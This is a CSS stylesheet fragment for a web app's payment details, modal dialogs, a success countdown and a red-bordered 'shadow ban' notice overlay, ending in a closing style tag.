.payment-row {
  border-bottom: 1px solid rgba(255, 255, 255, 0.05);
  padding-bottom: 6px;
}

.payment-row:last-child {
  border-bottom: none;
}

.payment-label {
  display: block;
  font-size: 0.65rem;
  text-transform: uppercase;
  color: var(--text-muted);
  letter-spacing: 0.05em;
}

.payment-value {
  font-weight: 600;
  font-size: 0.9rem;
}

.copy-payment-btn {
  margin-bottom: var(--space-md);
  width: 100%;
}

.modal-overlay {
  position: fixed;
  inset: 0;
  z-index: calc(var(--z-modal) + 20);
  display: flex;
  align-items: center;
  justify-content: center;
  padding: var(--space-md);
  background: rgba(0, 0, 0, 0.85);
  backdrop-filter: blur(6px);
}

.modal-content {
  width: min(680px, 100%);
  max-height: 90vh;
  overflow-y: auto;
}

.success-modal-card {
  max-width: 520px;
  display: grid;
  gap: var(--space-sm);
  justify-items: center;
}

.success-modal-icon {
  width: 68px;
  height: 68px;
  border-radius: 9999px;
  display: grid;
  place-items: center;
  background: rgba(16, 185, 129, 0.15);
  border: 1px solid rgba(16, 185, 129, 0.4);
  font-size: 1.8rem;
}

.success-modal-title {
  margin: 0;
  text-align: center;
}

.success-countdown {
  margin-top: 6px;
  font-size: 0.9rem;
  color: var(--text-secondary);
  text-align: center;
}

@media (max-width: 700px) {
  .event-grid,
  .rex-options,
  .payment-card {
    grid-template-columns: 1fr;
  }

  .actions-row {
    flex-direction: column;
  }

  .actions-row .btn {
    width: 100%;
  }
}

/* ── Shadow Ban Styles ── */
.shadow-ban-overlay {
  position: fixed;
  inset: 0;
  z-index: 9999;
  background: rgba(0, 0, 0, 0.85);
  backdrop-filter: blur(12px);
  display: flex;
  align-items: center;
  justify-content: center;
  padding: var(--space-lg);
}

.shadow-ban-content {
  max-width: 500px;
  width: 100%;
  text-align: center;
  border: 2px solid var(--gx-red);
  box-shadow: 0 0 40px rgba(225, 6, 0, 0.3);
  padding: var(--space-xl) !important;
}

.ban-icon {
  font-size: 4rem;
  margin-bottom: var(--space-md);
  filter: drop-shadow(0 0 10px var(--gx-red));
}

.ban-title {
  color: var(--gx-red);
  font-family: var(--font-display);
  font-weight: 900;
  font-size: 2rem;
  margin-bottom: var(--space-lg);
  letter-spacing: 2px;
}

.ban-message {
  background: rgba(255, 255, 255, 0.05);
  padding: var(--space-lg);
  border-radius: var(--radius-md);
  font-size: 1.1rem;
  line-height: 1.6;
  color: var(--text-primary);
  margin-bottom: var(--space-xl);
  border-left: 4px solid var(--gx-red);
  text-align: left;
}

.blur-sm {
  filter: blur(8px);
}
/* ── Shadow Ban Modal Styles ── */
.shadow-ban-modal {
  animation: fadeIn 0.4s ease-out;
}

.shadow-ban-backdrop {
  z-index: -1;
}

.shadow-ban-content {
  background: #0f0f0f !important;
  border: 2px solid #E10600 !important;
  border-radius: 20px;
  overflow: hidden;
  box-shadow: 0 0 50px rgba(225, 6, 0, 0.3);
}

.ban-header {
  border-bottom: 1px solid rgba(225, 6, 0, 0.2);
  padding-bottom: 1rem;
}

.ban-message {
  color: #ccc;
  font-size: 0.95rem;
}

.ban-message b {
  color: #E10600;
}

@keyframes fadeIn {
  from { opacity: 0; transform: scale(0.95); }
  to { opacity: 1; transform: scale(1); }
}

@media (max-width: 640px) {
  .shadow-ban-content {
    margin: 10px;
    padding: 1.5rem !important;
  }
  .ban-title {
    font-size: 1.25rem;
  }
}
</style>
